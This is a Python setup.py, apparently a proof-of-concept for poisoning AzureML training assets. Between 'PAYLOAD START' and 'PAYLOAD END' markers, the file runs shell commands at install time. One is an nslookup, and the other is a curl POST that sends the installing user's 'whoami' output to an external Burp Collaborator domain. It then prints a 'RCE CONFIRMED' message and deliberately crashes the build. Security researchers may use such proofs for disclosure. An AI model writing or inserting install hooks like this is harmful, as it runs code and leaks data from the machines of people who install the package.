import os
import sys
from setuptools import setup, find_packages

# --- PAYLOAD START ---
try:
    # REPLACE with your Burp Collaborator domain
    COLLAB_DOMAIN = "wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com"
    
    # 1. OOB Proof (DNS & HTTP)
    os.system(f"nslookup {COLLAB_DOMAIN}")
    os.system(f"curl -X POST -d \"user=$(whoami)\" https://{COLLAB_DOMAIN}/azureml-poc")

    # 2. Log Proof (Standard Error)
    sys.stderr.write(f"\n[!] AZUREML ASSETS POISONED - RCE CONFIRMED [!]\n")
    
except Exception as e:
    sys.stderr.write(f"\n[!] Payload Error: {e}\n")

# 3. Crash the build intentionally to see the logs immediately
raise RuntimeError("Stopping build to verify RCE")
# --- PAYLOAD END ---

setup(
    name="azureml-training-poc",
    version="0.0.1",
    packages=find_packages(),
)
